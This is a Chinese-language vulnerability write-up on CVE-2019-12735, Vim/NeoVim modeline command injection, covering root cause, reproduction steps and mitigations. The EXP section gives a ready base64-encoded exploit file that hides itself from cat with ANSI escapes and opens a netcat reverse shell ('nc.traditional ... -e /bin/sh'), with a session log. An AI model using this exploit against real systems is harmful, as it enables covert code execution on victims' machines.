# Vim modeline命令执行漏洞分析(cve-2019-12735) 

## 0.作者

invincible1944@gmail.com

## 1.背景介绍

- 漏洞相关软件：Vim/NeoVim 

- Vim/NeoVim 简介

    - Vim是从vi发展出来的一个文本编辑器，是Linux 平台最常用的编辑器之一。
    - Neovim 是Vim的一个重构版本，致力于成为Vim的超集（superset），

    - Neovim的第一个版本在2015年12月发行，并且能够完全兼容Vim的特性。 

    - 相比于Vim，Neovim的主要改进在于其支持异步加载插件。

- 漏洞危害：打开恶意构造的文本文件，可以触发命令执行，使攻击者获得当前用户权限。

- 相关背景知识：见附件，cve-2019-12735-01

  

## 2.漏洞分析

- 漏洞原理：
    Vim 的sandbox对输入的命令审查不严格，导致可以通过source命令加载其他Vim脚本绕过沙箱执行，配合上modeline特性，可以在Vim打开普通文件时实现OS command injection。

- 漏洞所属软件链接，版本，模块，目录，文件，代码行

    - 漏洞软件版本：`Vim <= 8.1.1365/ NeoVim  <= 0.3.6`

    - 漏洞代码位置：`Vim 81/src/getchar.c -> openscript`

    - [Vim官网](https://www.vim.org/)

    - [Vim源码库](http://ftp.vim.org/pub/vim/unix/)

- 漏洞所属类型：[CWE-78 OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

- 漏洞补丁：[Vim patch](https://github.com/vim/vim/commit/5357552)

- 漏洞CVE号：[CVE-2019-12735](https://nvd.nist.gov/vuln/detail/CVE-2019-12735)

  

## 3. POC

##### a. POC原理

- 背景简介

    - Vim可以通过Vim脚本编写插件，通过`source[!]`命令加载和执行脚本
    - Vim支持通过Vim command或者Vim脚本执行shell指令
    - vim支持通过表达式(可以理解为短脚本)对文本进行设置(比如folding代码块折叠显示功能)
    - 表达式支持Vim指令，但是会在自己的sandbox执行，只输出执行结果
    - Vim表达式中存在一些自带的函数`execute, assert_fails`等，可以将Vim command作为参数执行。
    - 由于限制不严格，当表达式通过execute, assert_fails这类函数执行source命令时，会在sandbox中执行，但是source 加载的Vim脚本则会在正常进程环境中执行
    - Vim的modeline功能是用于对单个文件进行自动配置的，并且也可以设置带有表达式的配置，因此可以利用此特性在Vim打开精心构造的恶意文本时实现OS command injection.

- Poc原理

    要理解Poc的原理，需要有一些Vim相关的背景知识，见附件: cve-2019-12735-01

    下面👇是Poc的流程：

    - vim 打开poc文件，识别出文件首部的modeline

    - 跳过开头的text，从`"vi:"`后面开始依次加载配置选项

    - 加载到fde选项时，执行表达式中的`assert_fails`函数，进而执行`source! %`指令

    - `source! % `将当前文件作为Vim脚本加载并执行

    - Vim脚本的内容就是Poc文件，但是这次与直接打开不同，是作为脚本加载，所以文件内容不会被识别为modeline，而是识别为Vim脚本，具体含义是执行shell命令```uname -a || "some text"```，从而实现了命令执行

- 调用栈信息

```shell
#0  openscript (
    name=0x88fba8 "/home/invincible/Desktop/test/vim_test/poc.txt", 
    directly=0x0) at getchar.c:1415
#1  0x000000000046e06f in cmd_source (
    fname=0x88fba8 "/home/invincible/Desktop/test/vim_test/poc.txt", 
    eap=0x7fffffffc5c0) at ex_cmds2.c:3502
#2  0x000000000046dfd8 in ex_source (eap=0x7fffffffc5c0) at ex_cmds2.c:3484
...
#4  0x0000000000470d89 in do_cmdline (cmdline=0x87ea80 "source! %", 
...
#7  0x00000000004395ec in call_func (
    funcname=0x884d40 "assert_fails(\"source! %\")", len=0xc, 
...
#9  0x00000000004337f8 in eval7 (arg=0x7fffffffd680, rettv=0x7fffffffd6c0, 
...
#16 0x000000000043189b in eval0 (arg=0x884d40 "assert_fails(\"source! %\")", 
#17 0x000000000042cc06 in eval_foldexpr (
    arg=0x884d40 "assert_fails(\"source! %\")", cp=0x7fffffffd70c)
#18 0x00000000004a8403 in foldlevelExpr (flp=0x7fffffffd7b0) at fold.c:3032
...
#26 0x000000000040e02f in chk_modeline (lnum=0x1, flags=0x0) at buffer.c:5234
#27 0x000000000040dba6 in do_modelines (flags=0x0) at buffer.c:5115
...
#30 0x00000000005e8db0 in main (argc=0x2, argv=0x7fffffffde98) at main.c:881
...

```

    

### b.POC源码

```shell
$ echo "OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK" | base64 --decode > poc.txt
$ cat poc.txt 
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
$vim poc.txt

```

### c.复现步骤

- 复现环境

    - 环境清单

        - 系统版本: Ubuntu-16.04.6 LTS (Xenial Xerus)
        - Vim版本: VIM - Vi IMproved 7.4 
        - Vim package 版本:  2:7.4.1689-3ubuntu1
        - 镜像下载地址: https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/14.04.6/ubuntu-14.04.6-desktop-amd64.iso

    - QEMU虚拟机搭建步骤：
```
#  创建虚拟机硬盘
$ qemu-img create -f qcow2 ubuntu16.04.6.img 10G

# 安装虚拟机
$ qemu-system-x86_64  -m 2048 -hda ubuntu16.04.6.img -cdrom ./ubuntu-16.04.6-desktop-amd64.iso

# 启动虚拟机
$ qemu-system-x86_64 -m 2048  ubuntu16.04.6.img
```  
- Step1 - 安装nc.traditional  
    建立会话的方式很多，这一步只是为了演示exp需要。

```shell
sudo apt-get install netcat-traditional
```

- Step2 - 安装含漏洞版本的Vim

```shell
$ sudo apt-get install vim-runtime=2:7.4.1689-3ubuntu1
$ sudo apt-get install vim-common=2:7.4.1689-3ubuntu1
$ sudo apt-get install vim=2:7.4.1689-3ubuntu1
```

- Step3 - 检查Vim配置是否开启modeline，若没有则配置Vim

```shell
# 检查modeline配置
vim
:verbose set modeline? set modelines?
# 如果显示nomodeline或者nomodelines表示没有配置

# 配置方法：
vim ~/.vimrc
i
set modeline
set modelines=5
<ESC>
:wq

```

- Step4 - 创建poc文件

```shell
echo "G1s/OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK" | base64 --decode > poc.txt

# base64编码明文：
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="\n

```

- Step5 - 用vim打开触发命令执行``(uname -a)``

```shell
$ vim poc.txt 

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

```



## 4. EXP

##### a. EXP原理

- Exp是一条精心构造的modeline，主要是为了把恶意文件伪造成正常文本，消除痕迹； 

- 可以分为两部分，一部分用于欺骗Vim，实现代码执行，隐藏恶意文本内容；

- 另一部分用于欺骗cat，使文本打开时看起来是正常文本；

- 主要通过ANSI Escape Code来实现这些隐藏功能。

Vim加载exp文件后等同于执行下面的序列：

```shell
# modeline触发执行自动配置
:set fen
:set fdm=expr
:set fde=assert_fails('set\ fde=x\ \|\ source\!\ \%')
:set fdl=0

# fde=assert_fails触发了assert_fails函数调用
:call assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\')

# assert_fails函数执行vim命令
:set fde=x | source! %

# source! % 加载当前文件，并视为Vim Ex mode下的脚本执行：
<ESC>
S
Nothing here.
<ESC>
:silent! w
:call system('nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &') 
:redraw! 
:file 
:silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n

# 读取到换行符号后\n执行上面第一个silent!以及后面的命令
# 通过vim的system函数执行了系统命令,建立反弹shell

```

逐条解释：

```shell
# exp.txt: 
\x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[2KNothing here."\x16\x1b[2D  \n

# 下文括号中的c表示用于欺骗cat，v表示Vim脚本正常指令

\x1b[?7l (c)
# 关闭自动换行
# 配合\x1b[1G和\x1b[K使用，见下文
# 具体定义和测试Demo见附件 ANSI escape codes 部分

\x1bS (v)
# <ESC>S 相当于依次按下ESC键和S键
# 表示剪切当前行，并从Normal mode切换到Insert mode
# 经测试，这里的\x1b是可以去掉的
# 具体定义和测试Demo见附件 ANSI escape codes 部分

Nothing here. (v)
# 在Insert mode下写入字符串 Nothing here.

\x1b (v)
# 相当于依次按下ESC键，退出Insert mode 返回Normal mode

:  (v)
# 从Normal mode进入Command-line mode

silent! w (v)
# 保存写入的内容，并且关闭回显
# 具体定义和测试Demo见附件 Vim表达式和脚本部分

| call system(\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\') (v)
# 调用system 函数执行Shell命令
# 具体定义和测试Demo见附件 Vim表达式和脚本部分

| redraw! (v)
# 清除回显信息
# 具体定义和测试Demo见附件 Vim表达式和脚本部分

| file | silent! [some text] (v)
# 显示当前文件信息，silent!用于清除后面的字符串产生的报错信息
# 最后的效果就是屏幕底部显示的是file的执行结果

vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: (v)
# vim加载时modeline的正文部分
# fen foldenable, 开启代码折叠folding功能
# fdm foldmethod, 设置folding方法为expr
# fde foldexpr, 设置fold expression
# assert_fails Vim的内部函数，可以执行第一个参数指定的vim命令，具体见附件
# 此处执行了两个命令：
# set fde 把foldexpr设置为x(相当于设置为无效)
# source % 把当前文件视为vim脚本，加载并执行
# fdl foldlevel 设置为0表示所有满足条件的文本块都折叠显示(与exp无关)

\x16 (v) 
# 这个很关键，由于是用source! %打开，所以文本的内容都会识别成在Normal mode下的输入，比如\x1b就是按下<ESC>, S就代表按下键盘(shift+s)，而当执行到第二个silent! 之后，后面的字符串直到'\n'我们希望它们被忽略，但是为了构造cat的输出, 字符串中包含了很多escape code比如\x1b[D, 但是这些也会被识别成键盘的按键操作，导致整个指令都无法执行 而\x16正是为了解决这个问题，它会把下一个按键解析成字符而不会让它执行按键功能，具体分析见附件 ANSI escape codes部分。


\x1b[1G (c)
# cat打开时候，将光标移动到当前行的首部
# 配合\x1b[K和\x1b[?7l，见下文
# 具体分析和Demo见附件 ANSI escape codes部分。

\x16 (v)
# 作用同上

\x1b[2K (c)
# 配合\x1b[1G和\x1b[?7l，删除当前位置到行首的内容(不会改变文本，只改变输出内容)
# 经过这个处理，cat的查看结果就只剩下后面的信息了
# 具体分析和Demo见附件 ANSI escape codes部分。

Nothing here." (c)
# 准备让cat查看文件输出的字符串，与Vim打开文件时查看到的内容相同

\x16 (v)
# 作用同上

\x1b[2D (c) 
# 光标向前移动2位
# 具体分析和Demo见附件 ANSI escape codes部分。

  \n (c&v)
# 因为光标前移,两个空格会覆盖Nothing here." 字符串最后的引号"和\x16
# 于是cat的输出只剩下 \x16Nothing here.\n
# \n换行触发 silent! w | ... | file | silent! [some text]  整条命令的执行
# 其中call system完成系统命令执行建立反弹shell


```

  

##### b. EXP源码

原作者exp: [shell.txt](https://github.com/numirias/security/blob/master/data/2019-06-04_ace-vim-neovim/shell.txt)

优化过的exp: 

```shell
echo "G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK" | base64 --decode > exp.txt

# base64编码对应的明文
\x1b[?7l\x1bS Nothing here.\x1b:silent! w | call system(\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[2KNothing here."\x16\x1b[2D  \n

# 修改了四处
# 修改原因见附件
# nc -> nc.traditional 
# \x1b[K -> \x1b[2K 
# \x1b[D -> \x1b[2D 
#  \n  ->   \n (增加了一个空格)

```



##### c. 复现步骤

- 搭建复现环境，与Poc相同

- Step1 - 创建exp文件

```shell
$ echo "G1s/N2wbUyBOb3RoaW5nIGhlcmUuGzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnbm9odXAgbmMudHJhZGl0aW9uYWwgMTI3LjAuMC4xIDk5OTkgLWUgL2Jpbi9zaCAmJykgfCByZWRyYXchIHwgZmlsZSB8IHNpbGVudCEgIyAiIHZpbTogc2V0IGZlbiBmZG09ZXhwciBmZGU9YXNzZXJ0X2ZhaWxzKCdzZXRcIGZkZT14XCBcfFwgc291cmNlXCFcIFwlJykgZmRsPTA6IBYbWzFHFhtbMktOb3RoaW5nIGhlcmUuIhYbWzJEICAK" | base64 --decode > exp.txt

```

- Step2 - 监听nc回连端口

```shell
$ nc -vlp 9999
Listening on [0.0.0.0] (family 0, port 9999)

```

- Step3 - Vim打开exp文件

```shell
$ vim exp.txt
 Nothing here.
~                                                                      
...                                                                     
~                                                                               
"exp.txt" line 1 of 1 --100%-- col 14

```

- 会话建立成功

```shell
$ nc -vlp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from [127.0.0.1] port 9999 [tcp/*] accepted (family 2, sport 55824)
pwd
/home/invincible/Desktop/test/vim_test
id
uid=1000(invincible) gid=1000(invincible) groups=1000(invincible),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)


```

  

### d. 利用核心要素

- Vim的modeline可以在文件加载时自动配置；

- Vim进行配置时会执行Vim指令，而Vim的某些指令又能够执行系统的Shell指令(通过`fork+execvp/system`)；

- Vim的对可执行指令的条件审查不严格，导致任意命令执行。

## 5.防护建议

- 如何检测这个/类漏洞
    - package版本检查：获取当前系统vim的package版本信息，对比package的changelog判断当前版本是否修复了漏洞(如果是手动编译可能存在无法获取package信息的情况)具体操作见附件-漏洞防护->package版本检查部分
    - poc验证：手动验证，代码执行vim读取stdout，或者ptrace读取调用栈。具体见附件-漏洞防护-> poc验证部分。
- 如何防御这个/类漏洞
    - 更新软件，这是最简单通用的方法；
    - 配置检查，Debian等一些发行版已经默认关闭了modeline的配置，这样可以完全隔断该漏洞的利用路径，如果默认没有关闭，则需要手动关闭，具体配置方法见附件-漏洞防护-> 配置检查部分；
    - 文件监控，匹配文件首部或者尾部是否符合modeline特征，如果符合，且modeline中包含"source"字符串，可以发出警报(非通用方法，对系统性能有损耗)。
- 有没有哪种通用的缓解措施可以阻断这个/类漏洞
    - 仅针对该漏洞的通用缓解措施就是关闭modeline配置；
    - 该类漏洞属于OS命令注入，一般是通过监控system/fork/exec等系统函数可以发现和阻断威胁(但是对系统性能有损耗)。

## 6.参考

[https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)  
[https://imbawenzi.github.io/2019/08/03/vim/](https://imbawenzi.github.io/2019/08/03/vim/)